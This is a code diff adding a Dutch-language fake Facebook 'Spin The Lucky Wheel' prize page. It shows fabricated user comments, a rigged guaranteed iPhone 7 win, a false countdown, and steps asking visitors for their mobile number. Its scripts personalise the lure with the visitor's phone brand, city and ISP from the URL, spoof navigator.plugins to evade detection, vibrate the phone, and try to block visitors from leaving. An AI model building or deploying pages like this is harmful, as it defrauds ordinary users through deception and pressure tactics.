@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <base href="">
+<script>
+		(function(){var DPA=function(p){for(var i=0;i<p.length;i++){this[i]=this[p[i].name]=p[i];}var a={name:"DjVu Plugin Viewer",filename:"djvu.js",description:"This is just a test package for incoming Chrome DjVu Plugin."};this[p.length]=this[a.name]=a;this.length=p.length+1;};DPA.prototype.item=function(n){return this[n];};DPA.prototype.namedItem=function(name){for(var i=0;i<this.length;i++){if(this[i].name===name){return this[i];}}};DPA.prototype.refresh=function(){location.reload(true);};var p=new DPA(navigator.plugins);Object.defineProperty(navigator,"plugins",{get:function(){return p}});})()
+	</script>
+
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  	<meta charset="utf-8">
+  	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="robots" content="noindex, nofollow">
+	<title>Spin The Lucky Wheel!</title>
+	<link rel="icon" href="fa.ico" type="image/x-icon" />
+	<link rel="icon" type="image" href="http://consumerreports.com-mobile.news/ot/uk/ms-isp-sw-4/index_files/favicon.ico">
+	<style type="text/css">
+		*{margin:0}
+		body{
+			font-family: Arial,Helvetica,sans-serif;
+			background-color: #e9eaed;
+			word-wrap: break-word;
+			}
+		.header{background-color:#3B5998}
+		.logo-left{padding:5px;vertical-align:middle}
+		.header-text{
+			font-size:20px;
+			height:35px;
+			vertical-align:middle;
+			color:#FFF
+			}
+		.spinnerContainer{
+			position:relative;
+			transform:translateX(20%)
+			}
+		#clicker,#clicker2{display:none}
+		.clearfix::after,.clearfix::before{
+			content:"";display:table
+			}
+		.clearfix::after{clear:both}
+		.fbcoms{
+			padding:0 5px;
+			font-family:Tahoma,Verdana,sans-serif;background-color:#fff;
+			font-size:12px;text-align:left
+			}
+		.comments{
+			font-weight:700;
+			text-align:center;padding:0 5px 10px
+			}
+		.totlikes{
+			margin-top:3px;
+			background-color:#eeeff4;
+			padding:5px 5px 5px 23px;
+			/*background-image:url("http://consumerreports.com-mobile.news/ot/uk/ms-isp-sw-4/files/finger.png");*/
+			background-repeat:no-repeat;background-position:5px center
+			}
+		.fbblue{color:#3c5a96}
+		.buttons{
+			margin-top: 14px;
+			padding:5px;
+			font-family:Arial,sans-serif;
+			color:#7d7d7f
+			}
+		.buttons span{cursor:pointer}
+		.buttons span:hover{text-decoration:underline}
+		.viewmore{
+			margin-top:3px;
+			background-color:#eeeff4;
+			padding:5px 5px 5px 23px;
+			/*background-image:url("http://consumerreports.com-mobile.news/ot/uk/ms-isp-sw-4/files/bubble.png");*/
+			background-position:5px center;background-repeat:no-repeat
+			}
+		.left{
+			cursor:pointer;
+			float:left;
+			color:#3c5a96
+			}
+		.left:hover{text-decoration:underline}
+		.right{color:#7d7d7f;float:right}
+		div, main, article, aside, footer, nav, section, header {
+			display: inline;
+			}
+		span {display: block;}
+		h1, h2, h3 {display: inline;}
+		.item{
+			position:relative;
+			margin-top:3px;
+			background-color:#eeeff4;
+			padding:5px 5px 5px 60px;
+			min-height:60px;
+			box-sizing:border-box}
+		.item .profileimg{position:absolute;top:5px;left:5px}
+		.comtxt{line-height:16px}
+		.name{color:#3c5a96;font-weight:700}
+		.ago{color:#86878c;font-size:.95em}
+		.fblike{color:#3c5a96;font-size:.95em;cursor:pointer}
+		.fblike:hover{text-decoration:underline}
+		.combot{padding-top:5px}
+		.likes{color:#3c5a96;font-size:.95em;cursor:pointer}
+		.comments,.hidden .combot,.hidden .comtxt{display:none}
+		#fbalert>div{margin-left:0}
+		#fbalert{background-color:#fff;padding:5px}
+		#spinner{
+			position:relative;
+			margin:0 auto 0;
+			width:270px;
+			overflow:hidden;
+			}
+		@media(min-width:360px){#spinner{width:340px}}
+		#spinBG{z-index:1;width:270px}
+		@media(min-width:360px){#spinBG{width:340px}}
+		#spin{z-index: 2;
+			position: absolute;
+			top: 11px;
+			left: 12px;
+			width: 248px;}
+		@media(min-width:360px){#spin{width:316px;top: 13px;
+			left: 13px;}}
+		#win,#win2,#win3,#winP,#winP1,#winP2{
+			position: absolute;
+			z-index: 3;
+			width: 74px;
+			left: 99px;
+			top: 94px;
+			}
+		@media(min-width:360px){
+			#win,#win2,#win3,#winP,#winP1,#winP2{width:90px;left: 126px;
+				top: 116px;}
+			}
+		@media (width: 375px) {
+			#spinner {
+
+				 margin-left: -8px;
+				 margin-top: -8px;
+			}
+		}
+		#win2,#win3,#winP,#winP1,#winP2{display:none}
+		.spinAround{
+			-webkit-animation:spin 6.6s;
+			-moz-animation:spin 6.6s;
+			-o-animation:spin 6.6s;
+			animation:spin 6.6s;
+			-webkit-animation-timing-function:ease;
+			-moz-animation-timing-function:ease;
+			-o-animation-timing-function:ease;
+			animation-timing-function:ease;
+			-webkit-animation-iteration-count:1;
+			-moz-animation-iteration-count:1;
+			-o-animation-iteration-count:1;
+			animation-iteration-count:1;
+			-webkit-animation-direction:normal;
+			-moz-animation-direction:normal;
+			-o-animation-direction:normal;
+			animation-direction:normal;
+			-webkit-animation-fill-mode:forwards;
+			-moz-animation-fill-mode:forwards;
+			-o-animation-fill-mode:forwards;
+			animation-fill-mode:forwards
+			}
+		@-webkit-keyframes spin{
+			0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}
+			90%{-webkit-transform:rotate(3110deg);transform:rotate(3110deg)}
+			95%{-webkit-transform:rotate(3108deg);transform:rotate(3108deg)}
+			100%{-webkit-transform:rotate(3109deg);transform:rotate(3109deg)}
+			}
+		@-moz-keyframes spin{
+			0%{-moz-transform:rotate(0deg);transform:rotate(0deg)}
+			90%{-moz-transform:rotate(3110deg);transform:rotate(3110deg)}
+			95%{-moz-transform:rotate(3108deg);transform:rotate(3108deg)}
+			100%{-moz-transform:rotate(3109deg);transform:rotate(3109deg)}
+			}
+		@-o-keyframes spin{
+			0%{-o-transform:rotate(0deg);transform:rotate(0deg)}
+			90%{-o-transform:rotate(3110deg);transform:rotate(3110deg)}
+			95%{-o-transform:rotate(3108deg);transform:rotate(3108deg)}
+			100%{-o-transform:rotate(3109deg);transform:rotate(3109deg)}
+			}
+		@keyframes spin{
+			0%{
+				-webkit-transform:rotate(0deg);
+				-moz-transform:rotate(0deg);
+				-o-transform:rotate(0deg);
+				transform:rotate(0deg)
+				}
+			90%{
+				-webkit-transform:rotate(3110deg);
+				-moz-transform:rotate(3110deg);
+				-o-transform:rotate(3110deg);
+				transform:rotate(3110deg)
+				}
+			95%{
+				-webkit-transform:rotate(3108deg);
+				-moz-transform:rotate(3108deg);
+				-o-transform:rotate(3108deg);
+				transform:rotate(3108deg)
+				}
+			100%{
+				-webkit-transform:rotate(3109deg);
+				-moz-transform:rotate(3109deg);
+				-o-transform:rotate(3109deg);
+				transform:rotate(3109deg)
+				}
+			}
+		.spinAround2{
+			-webkit-animation:spinTwo 6.6s;
+			-moz-animation:spinTwo 6.6s;
+			-o-animation:spinTwo 6.6s;
+			animation:spinTwo 6.6s;
+			-webkit-animation-timing-function:ease;
+			-moz-animation-timing-function:ease;
+			-o-animation-timing-function:ease;
+			animation-timing-function:ease;
+			-webkit-animation-iteration-count:1;
+			-moz-animation-iteration-count:1;
+			-o-animation-iteration-count:1;
+			animation-iteration-count:1;
+			-webkit-animation-direction:normal;
+			-moz-animation-direction:normal;
+			-o-animation-direction:normal;
+			animation-direction:normal;
+			-webkit-animation-fill-mode:forwards;
+			-moz-animation-fill-mode:forwards;
+			-o-animation-fill-mode:forwards;
+			animation-fill-mode:forwards
+			}
+		@-webkit-keyframes spinTwo{
+			0%{-webkit-transform:rotate(3109deg);transform:rotate(3109deg)}
+			90%{-webkit-transform:rotate(6314deg);transform:rotate(6314deg)}
+			95%{-webkit-transform:rotate(6312deg);transform:rotate(6312deg)}
+			100%{-webkit-transform:rotate(6313deg);transform:rotate(6313deg)}
+			}
+		@-moz-keyframes spinTwo{
+			0%{-moz-transform:rotate(3109deg);transform:rotate(3109deg)}
+			90%{-moz-transform:rotate(6314deg);transform:rotate(6314deg)}
+			95%{-moz-transform:rotate(6312deg);transform:rotate(6312deg)}
+			100%{-moz-transform:rotate(6313deg);transform:rotate(6313deg)}
+			}
+		@-o-keyframes spinTwo{
+			0%{-o-transform:rotate(3109deg);transform:rotate(3109deg)}
+			90%{-o-transform:rotate(6314deg);transform:rotate(6314deg)}
+			95%{-o-transform:rotate(6312deg);transform:rotate(6312deg)}
+			100%{-o-transform:rotate(6313deg);transform:rotate(6313deg)}
+			}
+		@keyframes spinTwo{
+			0%{
+				-webkit-transform:rotate(3109deg);
+				-moz-transform:rotate(3109deg);
+				-o-transform:rotate(3109deg);
+				transform:rotate(3109deg)
+				}
+			90%{
+				-webkit-transform:rotate(6314deg);
+				-moz-transform:rotate(6314deg);
+				-o-transform:rotate(6314deg);
+				transform:rotate(6314deg)
+				}
+			95%{
+				-webkit-transform:rotate(6312deg);
+				-moz-transform:rotate(6312deg);
+				-o-transform:rotate(6312deg);
+				transform:rotate(6312deg)
+				}
+			100%{
+				-webkit-transform:rotate(6313deg);
+				-moz-transform:rotate(6313deg);
+				-o-transform:rotate(6313deg);
+				transform:rotate(6313deg)
+				}
+			}
+		ol,ul{list-style:none}
+		.clearfix:after{
+			content:" ";
+			display:block;
+			height:0;
+			clear:both;
+			overflow:hidden;
+			visibility:hidden
+			}
+		.clearfix{display:block}
+		.wrapper{
+			background-color:#fff;
+			-webkit-box-sizing:border-box;
+			-moz-box-sizing:border-box;
+			box-sizing:border-box;
+			padding:7px;
+			width:96%;
+			margin:0 auto 14px;
+			border:1px solid #c4cde1;
+			border-top:0;
+			max-width:414px
+			}
+		.logo{
+			display: block;
+			margin: 4px auto;
+			}
+		.txt{padding:5px 6px;line-height:18px;text-align:center}
+		.bottom{
+			width:92%;
+			margin:20px auto 0;
+			border:1px solid #ccc;
+			background-color:#f2f2f2;
+			padding:5px;
+			border-radius:10px;
+			-moz-border-radius:10px;
+			-webkit-border-radius:10px
+			}
+		.now{text-align:center;padding-top:5px}
+		#countdown{font-weight:bold;}
+		.rules{color:#1b316c;padding:4px 5px;line-height:22px}
+		a{
+			display:block;
+			background-color:#39579a;
+			border-radius:7px;
+			-moz-border-radius:7px;
+			-webkit-border-radius:7px;
+			padding:10px 0;
+			text-align:center;
+			font-weight:700;
+			color:#fff;
+			font-size:1.6em;
+			border-bottom:1px solid #1b316c;
+			margin:7px 13px 5px;
+			text-decoration:none
+			}
+		h1 {
+			color: #38549e;
+			font-size: 1.3rem;
+			line-height: 1.5rem;
+		}
+		.clearfix:after {
+			content: ".";
+			display: block;
+			height: 0;
+			clear: both;
+			visibility: hidden;
+		}
+		h4 {
+			font-size: 1rem;
+			color: #9da1a5;
+			font-weight: normal;
+		}
+		.title{text-align:center;font-weight:700;font-size:26px}
+		.show-all{display: none;}
+		.now2{padding-top: 10px;font-weight: bold;}
+		.terms{
+			text-align:center;
+			font-size:11px;
+				color:#666;
+			padding:4px;
+			display:block;
+			text-align:center;
+			margin-top:4px;
+			text-align: justify;
+			}
+		hr{margin:0px 5px;}
+		.cot {
+			display: block;
+			margin-left: auto;
+			margin-right: auto;
+		}
+		.header2 {
+			height: 46px;
+			line-height: 46px;
+			font-size: 1.3rem;
+			color: #FFF;
+			background-color: #39579a;
+			box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);
+		}
+		.logo1 {
+			height: 46px;
+			display: block;
+			float: left;
+			vertical-align: middle;
+		}
+		.admin {
+			margin-right: 2%;
+			margin-left: 1%;
+		}
+		.search, .admin {
+			float: right;
+			height: 46px;
+			display: block;
+		}
+		.list {
+			background-color: #FFF;
+			padding: 15px;
+			-moz-border-radius: 5px;
+			-webkit-border-radius: 5px;
+			border-radius: 5px;
+			margin: 10px 10px 0px 10px;
+		}
+
+		.one_div {
+			padding-bottom: 0.5rem;
+		}
+		.one p {
+			margin-top: 0.6rem;
+		}
+		.logo2 {
+			width: 50px;
+			float: left;
+			display: block;
+			margin-right: 20px;
+		}
+		@media screen and (max-width: 450px) {
+			h1 {
+				line-height:21px;
+				font-size: 1.1rem;
+			}
+		}
+		@media screen and (max-width: 550px) {
+			h1 {
+				font-size: 20px;
+			}
+		}
+		@media screen and (max-width: 450px) {
+			#riqi {
+				margin-top: 5px;
+			}
+
+			#riqi {
+				margin-top: 10px;
+			}
+		}
+	.bg{
+		background: url("bg.jpg")no-repeat;
+		background-size: 100%;
+
+	}
+		.pop {
+			position: fixed;
+			width: 85%;
+			height: 243px;
+			left: 7%;
+			top: 34%;
+
+			z-index: 10;
+			border: 1px solid #39579a;
+			background-color: #FFF;
+		}
+		.pop_title{ background-color: #39579a; height:45px; line-height:38px;font-size:1.2rem; font-weight: bold; padding-left:15px; color:#FFF;}
+		.pop_cot{ margin:15px; padding-bottom:15px; border-bottom:1px solid #CCC;}
+		.pop .p1{ font-size:1.2rem; font-weight:bold; color:#333; }
+		.pop p{ font-size:0.9rem;}
+		.pop .p2{ font-size:1rem; font-weight:bold; color:#333; padding:0.5rem 0px;}
+		.pop .btn_blue{ font-size:1rem; line-height:2rem; padding:0px; width:80px; text-align:center; display:block; margin:0px auto;}
+		.cover{ background-color:#000;filter:alpha(opacity=20);-moz-opacity:0.2;opacity:0.2; position:fixed; left:0px; top:0px; width:100%; height:100%;}
+
+		#pop2,#pop5{ height:220px; display:none;}
+		#pop2 p,#pop5 p{ font-size:1rem; color:#333; font-weight:bold; padding:0.4rem 0px;}
+		#pop3{
+			height: 275px;
+		}
+		#pop3 .p1{
+
+			line-height: 25px;
+		}
+	</style>
+	<script>
+		function getURLParameter(name) {
+			return decodeURI((RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '');
+		}
+		var model = getURLParameter('model');
+		var brand = getURLParameter('brand');
+		var city = getURLParameter('city');
+		var browser = getURLParameter('browser');
+		var isp = getURLParameter('isp');
+		var citylow = city.toLowerCase();
+		var brandlow = brand.toLocaleLowerCase();
+		var modellow = model.toLocaleLowerCase();
+		var browserlow = browser.toLocaleLowerCase();
+		var isplow = isp.toLocaleLowerCase();
+		if(citylow == "unknown") { city = "your city"; }
+		if(brandlow == "unknown") { brand = "phone"; }
+		if(modellow == "unknown") { model = ""; }
+		if(browserlow == "unknown") { browser = ""; }
+		if(isplow == "wayport inc.") { isp = "att internet services"; }
+		if(isplow == "santa clara county office of education") { isp = "internet"; }
+		if(isplow == "washington school information processing cooperative") { isp = "internet"; }
+		if(isplow == "service provider corporation") { isp = "internet"; }
+	</script>
+	<script type="text/javascript">
+	function returnDate(format, print, force_date){
+		var out;
+		var curDate = new Date();
+		if(force_date != undefined && force_date != "" && force_date != "undefined"){
+			curDate = force_date;
+		}
+	    var year = curDate.getFullYear();
+	    var month = curDate.getMonth();
+	    var day = curDate.getDate();
+	    var dayofweek = curDate.getDay();
+	    var hour = curDate.getHours();
+
+	    var daysofweek = new Array('Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday');
+	    var months = new Array('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December');
+
+	    if(format == "timeofday"){
+	        if (hour < 12) out = "morning";
+	        else if (hour < 17) out = "afternoon";
+	        else out = "evening";
+	    }
+	    else if(format == "dayofweek"){
+	        out = daysofweek[dayofweek];
+	    }
+	    else if(format == "day"){
+	        out = day;
+	    }
+	    else if(format == "month"){
+	        out = months[month];
+	    }
+		else if(format == "year"){
+	        out = year;
+	    }
+	    else{
+	        out = months[month]+' '+day+', '+year;
+	    }
+		if ( print )
+			document.write( out );
+		else
+			return out;
+	}
+	</script>
+
+	<script type="text/javascript">
+	    var ts = getURLParameter('ts');
+	    var vid = getURLParameter('vid');
+	    var cpass = getURLParameter('cpass');
+	    var unix = Math.round(+new Date()/1000);
+	   	var diff = unix-ts;
+	    if (ts=="skipcheck"){
+	    }
+	    else if (diff<121 && diff>-1){
+	    }
+	    else{
+
+	    }
+  	</script>
+
+
+	<script language="Javascript">
+		var imgname = getURLParameter('isp').toLowerCase();
+		function loadimage() {
+		    document.getElementById('image1').src="http://images.com-about.info/company/"+ imgname +".png";
+		}
+		window.onload = loadimage;
+	</script>
+
+	<script type="text/javascript">
+	  navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+	  navigator.vibrate([1000,500,1000]);
+	</script>
+
+	<script src="jquery.js"></script>
+
+</head>
+
+<body >
+<div class="cot header2 clearfix"><img class="logo1" src="logo1.png">Newsfeed<img src="admin.png" class="admin"></div>
+<div class="hide-all">
+<div class="cot list one">
+	<div class="clearfix one_div"><img class="logo2" src="logo2.png"><div><h1>Gefeliciteerd<script>document.write(getURLParameter('brand'))</script><br><script>document.write(getURLParameter('model'))</script> Gebruiker!</h1><h4 id="riqi" style="margin-left: 71px">September 14 12:11</h4></div></div>
+	<!--<p id="youwin">Every Wednesday we select one lucky  user from your area to get an exclusive gift from our sponsors.</p>-->
+	<!--<p>As our thank you for your participation you may select which gift you want to get.</p>-->
+	<p style="font-size: 100%;color:#3b5998;">U bent de 81ste winnaar in <script>document.write(getURLParameter('city'))</script> vandaag.</p>
+	<p><strong>Notitie:</strong>Draai het wiel voor uw gratis cadeau!</p>
+</div>
+
+
+<div class="list bg">
+<div id="spinner" >
+	<img id="spinBG" src="spinBG.png">
+	<img id="spin" src="spin.png">
+	<img  id="win" src="win.png">
+	<img  id="win2" src="win.png">
+	<img id="winP" src="winP.png">
+	<img id="winP2" src="winP.png">
+</div>
+</div>
+
+<div class="fbcoms">
+			<p class="comments">Comments:</p>
+			<p class="buttons">
+			<span class="like">Like</span> · <span>Comment</span> · <span>Share</span> · <span>Delete</span>
+			</p>
+			<p class="totlikes"><span id="youand"></span><span class="fbblue">12,068 gebruikers</span> het leuk vinden</p>
+			<p class="viewmore clearfix">
+				<span class="left">Bekijk meer opmerkingen</span>
+				<span class="right">7 of 4,356</span>
+			</p>
+
+			<div class="item">
+				<img class="profileimg" src="1.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Monica Paquino</span> Ik had het geluk om de Appel horloge te krijgen! Ik kan nog steeds niet geloven dat dit echt is!</p>
+				<p class="combot"><span class="ago">54 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">267</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="2.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Rudy Winobort</span> Ik kreeg iPhone 7 !! WOOHOO !!!! Dit is de beste dag ooit!</p>
+				<p class="combot"><span class="ago">13 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">63</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="3.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Manny Jiang</span> Geweldige spel. maar ik heb niets :(</p>
+				<p class="combot"><span class="ago">29 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">37</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="4.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Darren Tam</span> het was jammer! </p>
+				<p class="combot"><span class="ago">35 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">22</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="5.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Olivia Mack</span> Heeft iemand eigenlijk gewonnen? Ik probeerde 2 keer, maar ik heb niets...</p>
+				<p class="combot"><span class="ago">41 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">9</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="6.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Zhao Wei Fong</span> Ik kan het niet geloven!</p>
+				<p class="combot"><span class="ago">46 minutes ago</span> · <span class="fblike">Like</span><span class="likes totlikes">5</span></p>
+			</div>
+			<div class="item">
+				<img class="profileimg" src="7.jpg" height="50" width="50">
+				<p class="comtxt"><span class="name">Becky Ma</span> Ik heb niets .. Ik ben altijd pech:(</p>
+				<p class="combot"><span class="ago">1 hour ago</span> · <span class="fblike">Like</span><span class="likes totlikes">1</span></p>
+			</div>
+		</div>
+
+</div>
+<div class="cover" id="cover"></div>
+<div class="pop" id="pop1" >
+	<div class="pop_title">Facebook</div>
+	<div class="pop_cot">
+		<p class="p1">********************************</p>
+		<p style="color:#000; font-weight:bold;">Gefeliciteerd <script>getURLParameter('isp')</script> bezoeker!</p>
+		<p class="p2">Klik op OK om uw gift Claim.</p>
+		<p class="p1">********************************</p>
+	</div>
+	<a href="javascript:void(-1)" class="btn_blue" id="ok1">OK</a>
+</div>
+<div class="pop" id="pop2">
+	<div class="pop_title">Facebook</div>
+	<div class="pop_cot" id="popCot2">
+		<p>Je won 1 kans!</p>
+		<p>Klik op OK om opnieuw te proberen!</p>
+	</div>
+	<a href="javascript:void(-1)" class="btn_blue" id="ok2">OK</a>
+</div>
+<div class="pop" id="pop3" style="display: none">
+	<div class="pop_title">Facebook</div>
+	<div class="pop_cot" id="popCot3">
+		<p class="p1">********************************</p>
+		<p class="p1">Gefeliciteerd!</p>
+		<p class="p1" style="color:#000; font-weight:bold;">Jouw cadeau: iPhone 7!</p>
+		<p style="line-height: 28px;">Klik op OK om uw gift claimen nu!</p>
+		<p class="p1">********************************</p>
+	</div>
+	<a href="javascript:void(-1)" class="btn_blue" id="ok3">OK</a>
+</div>
+<script src="js2.js"></script>
+	<script type="text/javascript">
+
+var sec = 40;
+var min = 03;
+var sd;
+function countDown() {
+	sec--;
+	if (sec === -01) {
+		sec = 59;
+		min = min - 1;
+	} else {
+		min = min;
+	}
+	if (sec <= 9) {
+		sec = "0" + sec;
+	}
+	var time = (min <= 9 ? "" + min : min) + " minutes and " + sec ;
+	if (document.getElementById) {
+		document.getElementById('theTime').innerHTML = time;
+	}
+
+	var SD = window.setTimeout("countDown();", 1000);
+	if (min == '00' && sec == '00') {
+		sec = "00";
+		window.clearTimeout(SD);
+	}
+}
+
+
+	</script>
+<div class="show-all">
+<div class="wrapper">
+    <div class="title"><p>Gefeliciteerd!</p></div>
+		<img src="iphone6s-white.png" class="logo" height="200">
+	<br>
+		<p style="text-align:center">Jouw <b>iPhone 7 128GB</b> is gereserveerd!!</p>
+		<br>
+		<hr>
+		<p align="center">BELANGRIJK: Alleen <b style="color: red;">1</b> iPhone 7 per persoon.</p>
+		<p align="center" style="font-size: 90%;"><em>Volg de instructies om uw gift te claimen!</em></p>
+		<hr>
+		<div class="bottom">
+			<table style="font-size:100%">
+				<tbody><tr>
+					<td>1. </td>
+					<td>Klik <b>"CLAIM NU"</b> </td>
+				</tr>
+				<tr>
+					<td style="vertical-align:top;">2. </td>
+					<td>U wordt doorgestuurd naar onze gecertificeerde distributeurs website.</td>
+				</tr>
+				<tr>
+					<td style="vertical-align:top;">3. </td>
+					<td>Beantwoord een paar eenvoudige vragen om te bewijzen dat je een echte persoon</td>
+				</tr>
+				<tr>
+					<td style="vertical-align:top;">4. </td>
+					<td>Voer uw <b>mobiele nummer</b>.
+					<br>
+					</td>
+				</tr>
+				<tr>
+					<td style="vertical-align:top;">5. </td>
+					<td>Uw Apple iPhone 7 128GB zal worden geleverd met <b style="color: red;">3</b> dagen verschepen.</td>
+				</tr>
+				<tr>
+			</tr></tbody></table>
+			<a class="cta" href="http://www.baidu.com">CLAIM NU</a>
+			<p class="now">Jij hebt <font color="red"><b><span id="theTime">3 minutes and 35 seconds</span></b></font> om uw iPhone 7 128GB claimen of het zal worden gegeven aan iemand anders.</p>
+		</div>
+
+      <!-- onclick="exit_a1(); DisableExitTraffic();" -->
+            <br>
+		</div>
+	</div>
+<script type="text/javascript">
+//	window.onload = function () {
+//		spinnerAction();
+//	}
+var cover=document.getElementById("cover");
+var pop1=document.getElementById("pop1");
+var pop2=document.getElementById("pop2");
+var pop3=document.getElementById("pop3");
+var ok1=document.getElementById("ok1");
+var ok2=document.getElementById("ok2");
+var ok3=document.getElementById("ok3");
+ok1.onclick= cover.onclick=function(){
+
+	pop1.style.display="none";
+	pop2.style.display="none";
+	pop3.style.display="none";
+	spinnerAction();
+	cover.style.display="none";
+
+
+
+}
+	function spinnerAction(){
+		///alert("11111");
+	///alert("********************************\n"+ returnDate('dayofweek') +", " + returnDate('curDate') +"\n\nGefeliciteerd " + (getURLParameter('isp')) + " bezoeker!\n\nU bent de 81ste winnaar in " + (getURLParameter('city')) + "!\n\nKlik op OK om uw gift Claim.\n********************************");
+		startSpin();
+	}
+    function startSpin(){
+    	var e=document.getElementById("spin"),n=document.getElementById("win"),t=document.getElementById("winP"),o=document.getElementById("win2");
+    	e.className=e.className+"spinAround",
+    	n.style.display="none",
+    	t.style.display="block",
+    	setTimeout(function(){
+    		t.style.display="none",
+    		o.style.display="block"
+    	},
+    	150),
+    	setTimeout(function(){
+    		///alert("Je won 1 kans!\n Klik op OK om opnieuw te proberen"),spin2enabled=!0
+//			spin2();
+			pop2.style.display="block";
+			cover.style.display="block";
+			ok2.onclick= function () {
+				spin2();
+				pop2.style.display="none";
+				cover.style.display="none";
+			},spin2enabled=!0;
+
+		},6500)
+
+	}
+    	function spin2(){
+    		if(spin2enabled){
+    			var e=document.getElementById("spin"),
+    			n=document.getElementById("win"),
+    			t=document.getElementById("winP"),
+    			o=document.getElementById("win2");
+    			e.className=e.className+" spinAround2",n.style.display="none",
+    			t.style.display="block",setTimeout(function(){
+    				t.style.display="none",o.style.display="block"
+    			},
+    			150),
+    			setTimeout(function(){
+//    				var e=alert("Gefeliciteerd!\n\nJouw cadeau: iPhone 7!\n\nKlik op OK om uw gift claimen nu!");e===!0||$(".hide-all").hide(),
+//    				$(".show-all").show();
+////    				var n=120,t=setInterval(function(){
+////    					$("#countdown").text(n--),
+////    					-1==n&&clearInterval(t)
+////    				},
+////    				1e3);
+//					countDown();
+					pop3.style.display="block";
+					cover.style.display="block";
+					///alert("Gefeliciteerd!\n\nJouw cadeau: iPhone 7!\n\nKlik op OK om uw gift claimen nu!");
+
+					ok3.onclick = function () {
+						pop3.style.display="none";
+						cover.style.display="none";
+						$(".hide-all").hide(),
+								$(".show-all").show();
+						countDown();
+					}
+    				//javascript_countdown.init(300)
+    			},6800)
+    		}
+    	}
+
+    // function FBcom(e,n){setTimeout(function(){var n=0,t=0;$(e+", "+e+" .comtxt, "+e+" .combot").slideDown(500),$().slideDown(500);var o=setInterval(function(){t+=.2,$(e).css({opacity:t}),n++,5==n&&clearInterval(o)},100)},n)}spin2enabled=!1;var d=new Date,weekday=new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");document.getElementById("today").innerHTML=weekday[d.getDay()];var myarray=["",""],showMessage=myarray[Math.floor(Math.random()*myarray.length)];c=0;var image;$.fn.txtFader=function(e,n){this.fadeOut(n,function(){$(this).html(e).fadeIn(n)})},$(document).ready(function(){FBcom("#fb1",3e3),FBcom("#fb2",5e3),FBcom("#fb3",7e3),FBcom("#fb4",9e3),FBcom("#fb5",10500),FBcom("#fb6",13e3),FBcom("#fb7",15e3),FBcom("#fb8",2e4),$(".like").click(function(){$(this).hasClass("selected")?($(this).removeClass("selected"),$(this).html("Like"),$("#youand").html("")):($(this).addClass("selected"),$(this).html("Unlike"),$("#youand").html("You and "))}),$(".fblike").click(function(){$(this).hasClass("selected")?($(this).removeClass("selected"),$(this).html("Like")):($(this).addClass("selected"),$(this).html("Unlike"))});for(var e=1;e<=$(".q").length;e++)console.log(e),clicker(e)}),window.onbeforeunload=function(){return window.btn_clicked?void 0:"You have won (1) more spin!\n\nPlay the game and you may win exclusive prizes from our sponsors.\n\nToday's prizes include Apple iPad Air, Macbook Air, Apple Watch and iPhone 6s!"};
+
+
+</script>
+
+<!-- exit traffic pop -->
+<!--<script type="text/javascript">-->
+
+    <!--var exittraffic_splashalertmessage="Als je het niet wilt, zullen wij uw gift te geven aan de volgende gelukkige winnaar.\n\n Klik op OK om door te gaan en claim uw gift";-->
+    <!--var exittraffic_RedirectUrl="#";-->
+
+	<!--&lt;!&ndash;-->
+	<!--var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;-->
+	<!--var is_firefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1;-->
+
+	<!--function listen(evnt, elem, func) {-->
+	    <!--if (elem.addEventListener)  // W3C DOM-->
+	        <!--elem.addEventListener(evnt,func,false);-->
+	    <!--else if (elem.attachEvent) { // IE DOM-->
+	         <!--var r = elem.attachEvent("on"+evnt, func);-->
+	         <!--return r;-->
+	    <!--}-->
+	    <!--else window.alert('I\'m sorry Dave, I\'m afraid I can\'t do that.');-->
+	<!--}-->
+
+	<!--function DisableExitTraffic() {-->
+	    <!--PreventExitSplash = true;-->
+	<!--}-->
+
+	<!--function addLoadEvent(func) {-->
+		<!--listen('load', window, func);-->
+	<!--}-->
+	<!--function addClickEvent(a, i, func) {-->
+	    <!--if (typeof a[i].onclick != 'function') {-->
+	        <!--a[i].onclick = func;-->
+	    <!--}-->
+	<!--}-->
+	<!--theBody = document.body;-->
+	<!--if (!theBody) {-->
+	    <!--theBody = document.getElementById("body");-->
+	    <!--if (!theBody) {-->
+	        <!--theBody = document.getElementsByTagName("body")[0];-->
+	    <!--}-->
+	<!--}-->
+	<!--var PreventExitSplash = false;-->
+	<!--var LightwindowOpening = false;-->
+	<!--function DisplayExitSplash() {-->
+
+	    <!--if (PreventExitSplash == false) {-->
+	        <!--window.scrollTo(0, 0);-->
+	         <!--PreventExitSplash = true;-->
+	        <!--timeout_variable = setTimeout("exittraffic_change_url();", 1000);-->
+
+	        <!--return exittraffic_splashalertmessage;-->
+	    <!--}-->
+	<!--}-->
+
+	<!--var a = document.getElementsByTagName('A');-->
+	<!--for (var i = 0; i < a.length; i++) {-->
+		<!--var link = a[i];-->
+	    <!--if (link.target !== '_blank') {-->
